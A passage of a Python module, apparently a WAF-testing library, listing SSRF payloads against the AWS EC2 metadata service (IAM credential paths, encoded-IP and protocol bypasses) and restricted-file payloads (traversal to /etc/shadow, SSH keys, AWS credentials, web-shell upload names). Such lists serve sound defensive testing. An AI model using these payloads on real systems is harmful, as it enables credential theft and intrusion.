        "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",  # Replace role-name with actual role
        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
        "http://169.254.169.254/latest/meta-data/network/interfaces/macs/mac-address/vpc-id",  # Replace mac-address with actual MAC
        "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
        "http://169.254.169.254/latest/user-data"
    ]
    
    # IMDSv2 token request
    IMDSV2 = [
        # Token request
        "http://169.254.169.254/latest/api/token",  # PUT request with X-aws-ec2-metadata-token-ttl-seconds: 21600
        # Using token
        "http://169.254.169.254/latest/meta-data/",  # GET request with X-aws-ec2-metadata-token: TOKEN_VALUE
        # PUT request for token followed by GET request using the token
        "http://169.254.169.254/latest/api/token",  # First request
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"  # Second request with token header
    ]
    
    # IP address variations
    IP_VARIATIONS = [
        "http://169.254.169.254/",
        "http://[::ffff:a9fe:a9fe]/",  # IPv6 mapped IPv4
        "http://[0:0:0:0:0:ffff:a9fe:a9fe]/",  # IPv6 mapped IPv4 full
        "http://0xa9fea9fe/",  # Hex representation
        "http://0xa9.0xfe.0xa9.0xfe/",  # Dotted hex
        "http://0251.0376.0251.0376/",  # Octal representation
        "http://0251.254.0251.254/",  # Mixed octal and decimal
        "http://2852039166/",  # Decimal representation
        "http://169.0xfe.169.0xfe/",  # Mixed decimal and hex
        "http://169.254.169.0376/",  # Mixed decimal and octal
        "http://169.254.0xa9.0xfe/",  # Mixed dotted notation
        "http://169.254.0xa9fe/",  # Partially dotted hex
        "http://169.0xfea9fe/",  # Partially dotted decimal
        "http://0xa9.0xfe.0xa9fe/",  # Partially dotted notation
        "http://a9fe:a9fe::1/",  # IPv6 condensed
        "http://169.254.0x41206.254/",  # Out of range octet
        "http://17185825022/",  # Unsigned integer overflow
    ]
    
    # URL encoding variations
    ENCODED = [
        "http://169.254.169.254/",
        "http:%2f%2f169.254.169.254%2f",  # URL encoded
        "http:%2f%2f169.254.169.254%2flatest%2fmeta-data%2f",
        "http:%2f%2f169.254.169.254%2flatest%2fmeta-data%2fiam%2fsecurity-credentials%2f",
        "http:%252f%252f169.254.169.254%252f",  # Double URL encoded
        "http:%252f%252f169.254.169.254%252flatest%252fmeta-data%252f",
        "http://169%252e254%252e169%252e254/",  # URL encoded dots
        "http://169.254.169%E3%80%82254/",  # Unicode full stop instead of dot
        "http://169%c0%ae254%c0%ae169%c0%ae254/",  # URL encoded alternate character
        "http://169%u002e254%u002e169%u002e254/",  # URL encoded with %u
        "http://169\u200d.254\u200d.169\u200d.254/",  # With zero-width joiners
        "http://169\u200c.254\u200c.169\u200c.254/",  # With zero-width non-joiners
        "http://169\u180e.254\u180e.169\u180e.254/",  # With Mongolian vowel separator
        "http://\u2068169.254.169.254\u2069/",  # With first strong isolate
        "http://169.254.169.254\ufeff/",  # With BOM
    ]
    
    # Protocol variations
    PROTOCOL = [
        "http://169.254.169.254/",
        "https://169.254.169.254/",  # HTTPS
        "http://169.254.169.254:80/",  # Explicit port
        "http://169.254.169.254:443/",  # Alternative port
        "http://169.254.169.254:8080/",  # Common alternate port
        "//169.254.169.254/",  # Protocol-relative URL
        "http:169.254.169.254/",  # Missing slashes
        "http:/169.254.169.254/",  # Single slash
        "http:///169.254.169.254/",  # Triple slash
        "https:169.254.169.254/",  # HTTPS missing slashes
        "https:/169.254.169.254/",  # HTTPS single slash
        "https:///169.254.169.254/",  # HTTPS triple slash
        "file:///169.254.169.254/",  # File protocol (local file access)
        "ftp://169.254.169.254/",  # FTP protocol
        "gopher://169.254.169.254/",  # Gopher protocol
        "data://169.254.169.254/",  # Data protocol
        "jar:http://169.254.169.254/!/",  # JAR protocol
        "dict://169.254.169.254/",  # Dict protocol
        "ldap://169.254.169.254/",  # LDAP protocol
        "tftp://169.254.169.254/",  # TFTP protocol
    ]
    
    # Domain + path variations
    DOMAIN = [
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254%00/",  # Null byte
        "http://169.254.169.254%0A/",  # Newline
        "http://169.254.169.254%0D/",  # Carriage return
        "http://169.254.169.254%09/",  # Tab
        "http://169.254.169.254%20/",  # Space
        "http://169.254.169.254.nip.io/",  # Using nip.io DNS
        "http://169-254-169-254.nip.io/",  # Using hyphens
        "http://169.254.169.254/..;/",  # Path traversal
        "http://169.254.169.254/;latest/meta-data/",  # Path parameter
        "http://169.254.169.254/.;/latest/meta-data/",  # Path manipulation
        "http://169.254.169.254/.%0d./.%0d./latest/meta-data/",  # Path evasion
        "http://169.254.169.254/#/../latest/meta-data/",  # Fragment bypass
        "http://169.254.169.254/?/../latest/meta-data/",  # Query parameter bypass
        "http://169.254.169.254/./latest/./meta-data/./",  # Current directory references
        "http://customer.com#@169.254.169.254/",  # Fragment bypass with domain
        "http://customer.com@169.254.169.254/",  # Basic auth style URL confusion
        "http://customer.com:@169.254.169.254/",  # Basic auth with empty password
        "http://customer.com%23@169.254.169.254/",  # URL encoded fragment
        "http://customer.com+@169.254.169.254/",  # URL syntax confusion
    ]
    
    # Request headers and methods
    REQUESTS = [
        # Standard GET request
        "http://169.254.169.254/latest/meta-data/",
        
        # IMDSv2 token request (PUT with header)
        "http://169.254.169.254/latest/api/token",  # X-aws-ec2-metadata-token-ttl-seconds: 21600
        
        # Using token in subsequent request
        "http://169.254.169.254/latest/meta-data/",  # X-aws-ec2-metadata-token: TOKEN_VALUE
        
        # Using specific AWS regions
        "http://169.254.169.254/latest/meta-data/placement/region",
        
        # Fetch specific role credentials
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
        
        # Request with Host header override
        "http://example.com/",  # Host: 169.254.169.254
        
        # Request with X-Forwarded-Host header
        "http://example.com/",  # X-Forwarded-Host: 169.254.169.254
        
        # Request with X-Forwarded-Server header
        "http://example.com/",  # X-Forwarded-Server: 169.254.169.254
        
        # Request with X-Host header
        "http://example.com/",  # X-Host: 169.254.169.254
        
        # Request with HTTP/1.0 
        "http://169.254.169.254/latest/meta-data/",  # HTTP/1.0
        
        # SSRF with redirects
        "http://example.com/redirect-to?url=http://169.254.169.254/",
        
        # SSRF via referer
        "http://169.254.169.254/",  # Referer: http://169.254.169.254/latest/meta-data/
    ]
    
    @classmethod
    def all(cls) -> list:
        """Return all EC2 metadata vectors."""
        return (
            cls.BASIC +
            cls.SENSITIVE +
            cls.IMDSV2 +
            cls.IP_VARIATIONS +
            cls.ENCODED +
            cls.PROTOCOL +
            cls.DOMAIN +
            cls.REQUESTS
        )
    
    @classmethod
    def basic(cls) -> list:
        """Return basic EC2 metadata vectors."""
        return cls.BASIC
    
    @classmethod
    def sensitive(cls) -> list:
        """Return vectors targeting sensitive EC2 metadata."""
        return cls.SENSITIVE
    
    @classmethod
    def ip_variations(cls) -> list:
        """Return EC2 metadata vectors with IP address variations."""
        return cls.IP_VARIATIONS
    
    @classmethod
    def encoded(cls) -> list:
        """Return encoded EC2 metadata vectors."""
        return cls.ENCODED
    
    @classmethod
    def imdsv2(cls) -> list:
        """Return vectors for IMDSv2 token-based metadata access."""
        return cls.IMDSV2


class RestrictedExtensionsVectors:
    """Restricted file extension attack vectors for testing WAF rules."""
    
    # Basic restricted extensions
    BASIC = [
        # Configuration files
        ".htaccess",
        ".htpasswd",
        ".conf",
        ".config",
        ".ini",
        ".xml",
        ".yml",
        ".yaml",
        ".json",
        ".properties",
        ".env",
        ".lock",
        "web.config",
        "php.ini",
        "httpd.conf",
        "nginx.conf",
        
        # Backup files
        ".bak",
        ".backup",
        ".old",
        ".orig",
        ".save",
        ".swp",
        ".swo",
        ".tmp",
        ".temp",
        ".dist",
        ".cache",
        "~",
        
        # Database files
        ".sql",
        ".db",
        ".sqlite",
        ".sqlite3",
        ".mdb",
        ".accdb",
        ".dbf",
        ".pdb",
        ".myd",
        ".frm",
        ".odb",
        
        # Log files
        ".log",
        ".log.1",
        ".error",
        ".debug",
        "access_log",
        "error_log",
        "debug_log",
        "application.log",
        
        # Source code files
        ".inc",
        ".phtml",
        ".php.bak",
        ".php~",
        ".php.old",
        ".php.save",
        ".php.swp",
        ".php.swo",
        ".php.dist",
        ".asp.bak",
        ".aspx.bak",
        ".jsp.bak",
        ".html.bak",
        ".txt.bak",
        
        # Version control
        ".git",
        ".svn",
        ".hg",
        ".CVS",
        
        # IDE files
        ".idea",
        ".vscode",
        ".project",
        ".DS_Store",
        "Thumbs.db",
        
        # Archive files
        ".zip",
        ".tar",
        ".tar.gz",
        ".tgz",
        ".rar",
        ".7z",
        ".jar",
        ".war",
        
        # Executable/script files
        ".sh",
        ".bash",
        ".bat",
        ".cmd",
        ".exe",
        ".dll",
        ".so",
        ".bin",
        ".py",
        ".pl",
        ".cgi",
        ".vbs",
        ".ps1"
    ]
    
    # File paths with sensitive information
    SENSITIVE_PATHS = [
        # Common configuration files
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/apache2/apache2.conf",
        "/etc/nginx/nginx.conf",
        "/etc/mysql/my.cnf",
        "/etc/php/php.ini",
        "/etc/ssh/sshd_config",
        
        # Web application configurations
        "/var/www/html/.env",
        "/var/www/html/config.php",
        "/var/www/html/wp-config.php",
        "/var/www/html/configuration.php",
        "/var/www/html/sites/default/settings.php",
        "/var/www/html/config/database.yml",
        
        # Windows system files
        "C:\\Windows\\win.ini",
        "C:\\Windows\\system.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\repair\\sam",
        "C:\\Windows\\repair\\system",
        "C:\\Windows\\repair\\software",
        "C:\\Windows\\repair\\security",
        "C:\\boot.ini",
        "C:\\WINDOWS\\Panther\\Unattend.xml",
        
        # Application configurations
        "/app/config/parameters.yml",
        "/opt/tomcat/conf/server.xml",
        "/usr/local/etc/redis/redis.conf",
        "/home/user/.ssh/id_rsa",
        "/root/.bash_history",
        "/root/.ssh/id_rsa",
        
        # Log files
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/mysql/error.log",
        "/var/log/syslog",
        "/var/log/auth.log",
        
        # Database dumps
        "/var/www/html/backup.sql",
        "/var/www/html/db_backup.sql",
        "/backup/database.sql",
        
        # Source code repositories
        "/.git/config",
        "/.git/HEAD",
        "/.svn/entries",
        "/.svn/wc.db",
        
        # AWS specific
        "/.aws/credentials",
        "/.aws/config",
        "/var/www/html/aws.yml",
        
        # Docker specific
        "/root/.dockercfg",
        "/.docker/config.json",
        "/var/lib/docker/secrets/",
        
        # WordPress specific
        "/var/www/html/wp-config.php.bak",
        "/var/www/html/wp-content/debug.log",
        
        # Laravel specific
        "/var/www/html/.env.backup",
        "/var/www/html/storage/logs/laravel.log",
        
        # Credential files
        "/var/www/html/credentials.xml",
        "/app/config/credentials.json",
        "/var/www/api_keys.txt"
    ]
    
    # Path traversal combined with restricted extensions
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "../../../etc/shadow",
        "../../../etc/hosts",
        "../../.htpasswd",
        "../../wp-config.php",
        "../../config.php",
        "../../.env",
        "../../database.yml",
        "../../application.properties",
        "../../../../windows/win.ini",
        "../../../../windows/system.ini",
        "../../.git/config",
        "../../.svn/entries",
        "../../../var/www/html/config.php.bak",
        "../../../var/log/apache2/access.log",
        "../../../var/log/nginx/error.log",
        "../../backup/db_backup.sql",
        "../../.aws/credentials",
        "../../../root/.ssh/id_rsa",
        "../../app/config/secrets.yml",
        "../../../opt/tomcat/conf/server.xml",
        "../../../../Program Files/MySQL/MySQL Server 5.7/my.ini",
        "../logs/application.log",
        "../conf/server.xml",
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\system.ini",
        "..\\..\\web.config",
        "..\\..\\application.config"
    ]
    
    # Evasion techniques
    EVASION = [
        # URL encoding
        "%2e%68%74%61%63%63%65%73%73",  # .htaccess
        "%2e%68%74%70%61%73%73%77%64",  # .htpasswd
        "%2e%65%6e%76",  # .env
        "%2e%62%61%6b",  # .bak
        "%2e%67%69%74",  # .git
        
        # Double encoding
        "%252e%2568%2574%2561%2563%2563%2565%2573%2573",  # .htaccess
        "%252e%2562%2561%256b",  # .bak
        "%252e%2570%2568%2570%252e%2562%2561%256b",  # .php.bak
        
        # Case variation
        ".HtAcCeSs",
        ".hTpAsSWd",
        ".GiT",
        ".BaK",
        ".PhP.BaK",
        
        # Null byte injection
        ".htaccess%00",
        ".php.bak%00",
        ".env%00",
        "wp-config.php.bak%00",
        ".git/config%00",
        
        # Alternative extensions
        ".htaccess.txt",
        ".htpasswd.txt",
        "web.config.txt",
        "php.ini.txt",
        "config.php.txt",
        ".env.txt",
        
        # Multiple extensions
        ".htaccess.jpg",
        ".htpasswd.png",
        "config.php.jpg",
        ".env.jpg",
        "backup.sql.jpg",
        "id_rsa.jpg",
        
        # Unicode normalization
        ".htaccess\u3000",  # Ideographic space
        ".env\u2000",  # En quad space
        "config.php.bak\u2001",  # Em quad space
        ".git\u2003/config",  # Em space
        
        # Mixed encoding
        "%2ehtaccess",
        ".%68taccess",
        ".ht%61ccess",
        ".hta%63cess",
        ".htac%63ess",
        ".htacc%65ss",
        ".htacce%73s",
        ".htacces%73",
        
        # Path obfuscation
        ".//.htaccess",
        ".///.htaccess",
        "./.htaccess",
        "//.htaccess",
        "/.htaccess",
        "/./.htaccess",
        "/././.htaccess",
        "////.htaccess"
    ]
    
    # Extension/MIME type confusion
    MIME_CONFUSION = [
        # Image with PHP code
        "shell.jpg.php",
        "shell.png.php",
        "shell.gif.php",
        "shell.php.jpg",
        "shell.php.png",
        "shell.php.gif",
        
        # Files with multiple extensions
        "file.php.jpg",
        "file.jpg.php",
        "file.php.png",
        "file.png.php",
        "file.php.pdf",
        "file.pdf.php",
        "file.php.txt",
        "file.txt.php",
        
        # Extensions with special characters
        "file.ph\u0000p",  # Null character
        "file.ph\u0001p",  # Control character
        "file.php\u200B",  # Zero width space
        "file.php\u200C",  # Zero width non-joiner
        "file.php\u200D",  # Zero width joiner
        "file.php\uFEFF",  # Byte order mark
        
        # MIME type confusion
        "file.jpg",  # Actually a PHP file with JPEG headers
        "file.png",  # Actually a PHP file with PNG headers
        "file.gif",  # Actually a PHP file with GIF headers
        "file.pdf",  # Actually a PHP file with PDF headers
        
        # Unusual extensions
        "file.php3",
        "file.php4",
        "file.php5",
        "file.php7",
        "file.phtml",
        "file.phar",
        "file.phps",
        "file.pht",
        "file.pgif",
        "file.phtm",
        "file.php.xxxxx",  # Long extension
        
        # Uncommon archive formats
        "file.php.rar",
        "file.php.zip",
        "file.php.tar",
        "file.php.gz",
        "file.php.7z",
        "file.php.bz2",
        
        # Mixed case
        "file.PhP",
        "file.pHp",
        "file.Php",
        "file.PHp",
        "file.pHP"
    ]
    
    @classmethod
    def all(cls) -> list:
        """Return all restricted extension vectors."""
        return (
            cls.BASIC +
            cls.SENSITIVE_PATHS +
            cls.PATH_TRAVERSAL +
            cls.EVASION +
            cls.MIME_CONFUSION
        )
    
    @classmethod
    def basic(cls) -> list:
        """Return basic restricted extension vectors."""
        return cls.BASIC
    
    @classmethod
    def sensitive(cls) -> list:
        """Return sensitive path vectors."""
        return cls.SENSITIVE_PATHS
    
    @classmethod
    def traversal(cls) -> list:
        """Return path traversal combined with restricted extensions."""
        return cls.PATH_TRAVERSAL
    
    @classmethod
    def evasion(cls) -> list:
        """Return extension evasion techniques."""
        return cls.EVASION + cls.MIME_CONFUSION


if __name__ == "__main__":
    print("Common Attack Vectors module loaded.")
    print("Available vector classes:")
    print("- SQLInjectionVectors")
    print("- XSSVectors")
    print("- LFIVectors")
    print("- RFIVectors")
    print("- CommandInjectionVectors")
    print("- EC2MetadataVectors")
    print("- RestrictedExtensionsVectors")